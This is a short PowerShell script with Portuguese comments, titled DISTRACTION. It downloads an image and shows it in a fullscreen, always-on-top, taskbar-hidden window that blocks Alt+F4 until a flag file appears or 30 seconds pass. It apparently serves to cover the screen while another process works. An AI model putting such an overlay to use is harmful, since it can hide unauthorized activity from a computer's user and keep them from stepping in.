
# DISTRACTION.ps1 - com imagem baixada em formato compatível
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# CONFIG
$flagFile = "$env:TEMP\END_ALL.txt"
$timeoutSeconds = 30
$checkInterval = 500

# URL da imagem (agora forçando PNG)
$imageUrl = "https://i.ibb.co/KjFPH40Y/Whats-App-Image-2026-07-17-at-18-32-03.png"

# --- BAixa a imagem e salva em arquivo temporário (evita problemas de memória/stream) ---
$tempFile = [System.IO.Path]::GetTempFileName() + ".png"
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $webClient.DownloadFile($imageUrl, $tempFile)
    $bitmap = [System.Drawing.Image]::FromFile($tempFile)
} catch {
    # Se falhar, cria uma imagem de fallback (ex: texto "Erro" ou cor sólida)
    Write-Host "Erro ao baixar imagem: $_"
    $bitmap = New-Object System.Drawing.Bitmap(1,1)
    # Para não ficar branco, pinte de preto ou outra cor
    $bitmap.SetPixel(0,0,[System.Drawing.Color]::Black)
} finally {
    if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
}

# --- CRIA O FORMULÁRIO ---
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.TopMost = $true
$form.BackgroundImage = $bitmap
$form.BackgroundImageLayout = [System.Windows.Forms.ImageLayout]::Stretch
$form.ShowInTaskbar = $false
$form.BackColor = [System.Drawing.Color]::Black  # fundo preto se a imagem não carregar

# Bloqueia ALT+F4
$form.Add_KeyDown({
    if ($_.Alt -and $_.KeyCode -eq 'F4') {
        $_.SuppressKeyPress = $true
    }
})
$form.KeyPreview = $true

$form.Show()

# Loop de monitoramento...
$startTime = Get-Date
$flagFound = $false
while ($true) {
    if (Test-Path $flagFile) {
        $flagFound = $true
        break
    }
    if ((Get-Date) - $startTime -gt (New-TimeSpan -Seconds $timeoutSeconds)) {
        break
    }
    Start-Sleep -Milliseconds $checkInterval
    [System.Windows.Forms.Application]::DoEvents()
}

$form.Close()
[System.GC]::Collect()
if ($flagFound) {
    Remove-Item $flagFile -Force -ErrorAction SilentlyContinue
}